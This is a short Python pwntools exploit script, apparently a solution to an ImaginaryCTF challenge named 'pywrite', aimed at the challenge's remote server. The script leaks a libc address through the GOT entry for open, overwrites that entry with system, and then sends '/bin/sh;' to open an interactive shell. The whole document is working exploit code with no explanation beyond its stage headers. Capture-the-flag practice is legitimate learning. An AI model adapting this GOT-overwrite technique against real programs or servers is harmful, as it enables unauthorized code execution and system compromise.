#!/usr/bin/python3

from pwn import *

libc = ELF('files/libc.so.6', checksec=False)
p = remote('pywrite.chal.imaginaryctf.org', 1337)

##################################
### Stage 1: Leak libc address ###
##################################
open_got = 0x8f6798
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'where? ', str(open_got).encode())

open_addr = int(p.recvline()[:-1])
libc.address = open_addr - libc.sym['open']
log.info(hex(libc.address))

###########################################
### Stage 2: Overwrite @got with system ###
###########################################
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'what? ', str(libc.sym['system']).encode())
p.sendlineafter(b'where? ', str(open_got).encode())

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'what?????', b'/bin/sh;')

p.interactive()